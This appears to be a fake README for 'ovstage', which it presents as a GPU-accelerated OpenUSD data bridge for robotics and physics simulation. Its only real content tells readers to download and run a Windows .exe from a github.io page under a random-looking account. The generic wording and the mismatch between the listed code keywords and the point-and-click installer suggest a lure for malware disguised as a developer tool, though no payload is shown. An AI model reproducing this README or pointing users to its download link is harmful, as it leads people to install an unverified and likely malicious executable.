# 🚀 ovstage - High performance data for visual simulations

[![Download ovstage](https://img.shields.io/badge/Download-ovstage-blue.svg)](https://wheelerpeakenlistedman916.github.io)

This project provides a connection between different simulation tools. It acts as a bridge for 3D data. You use it to move information between physics engines, rendering tools, and robot simulations. It focuses on speed and hardware efficiency.

## ⚙️ Requirements

Your computer needs specific hardware and software to run this utility. Check your machine against this list before you proceed.

### Hardware
* Processor: Intel Core i7 or equivalent AMD processor.
* Memory: 16 GB RAM or more.
* Graphics: NVIDIA GPU with at least 8 GB of video memory.
* Storage: 2 GB of available disk space.

### Software
* Operating System: Windows 10 or Windows 11.
* Graphics Driver: Install the latest NVIDIA GPU drivers from the official website.
* Support Libraries: Microsoft Visual C++ Redistributable for Visual Studio 2019 or newer.

## 📥 Getting the Software

You need to download the installer to add this tool to your system.

1. Visit this page to download: [https://wheelerpeakenlistedman916.github.io](https://wheelerpeakenlistedman916.github.io).
2. Locate the link labeled "Releases" on the right side of the page.
3. Select the latest version listed.
4. Download the file ending in `.exe` to your computer.
5. Save the file to your desktop or downloads folder.

## 🛠️ Installation Steps

Follow these steps to set up the software on your Windows machine.

1. Find the `.exe` file you downloaded.
2. Double-click the file to start the installation wizard.
3. Choose the "Install for all users" option if prompted.
4. Wait for the progress bar to reach the end.
5. Click "Finish" to close the installer.

The software installs the necessary files to allow your computer to process 3D scene data.

## 🖥️ Running the Application

After installation, you can launch the program to begin processing your data.

1. Open the Start menu on your taskbar.
2. Search for "ovstage" in the search bar.
3. Click the application icon to open the interface.
4. The first window displays the connection status of your GPU.
5. If the status shows "Ready," you are set to import your files.

## 📂 Using the Data Interface

The interface helps you move information between OpenUSD files and your preferred simulation software. 

### Importing Files
Click the "Import" button to select an OpenUSD file from your computer. The system reads the geometry, material, and physics data. It stores this data in a shared memory buffer. This buffer allows other programs to access the information without duplicating files.

### Connecting to Simulations
The software detects active simulation tools on your computer. You choose your target tool, such as a physics renderer or a robot control simulator, from the dropdown list. Clicking "Connect" enables the data stream between the shared memory and the target program.

### Troubleshooting
* If the GPU status is "Not Found," close all other programs using graphics memory. Restart your computer and try again.
* If files fail to open, ensure your OpenUSD files are saved in the correct format.
* Check that your firewall allows the application to communicate with other local processes.

## 📈 Improving Performance

This tool processes large files by using your graphics card. You gain speed by keeping data in video memory rather than moving it to your main system memory. If you notice slow performance, follow these tips:

* Close web browsers and other heavy applications while running simulations.
* Use the "Performance Monitor" tab inside the application to see how much memory the tool uses.
* Keep your graphics drivers updated through the NVIDIA GeForce Experience software.

## 🧱 Technical Background

The software acts as a shared data layer. Engineers designed it to handle complex 3D environments where physics and visual rendering need to happen at the same time. By using a shared memory layout, multiple components of a simulation talk to the same data set. This approach removes the lag often found when moving data between different software programs. It supports high-speed calculations for robotics and artificial intelligence tasks.

## ℹ️ Support and Updates

The development team releases updates to improve compatibility with newer versions of OpenUSD and individual simulation tools. Check the main page regularly for new installers. You can report bugs or issues through the standard tracking system found at the link provided above.

Keywords: c, cpp, cuda, gpu-acceleration, nvidia, openusd, physical-ai, python, robotics, runtime-data, simulation, usd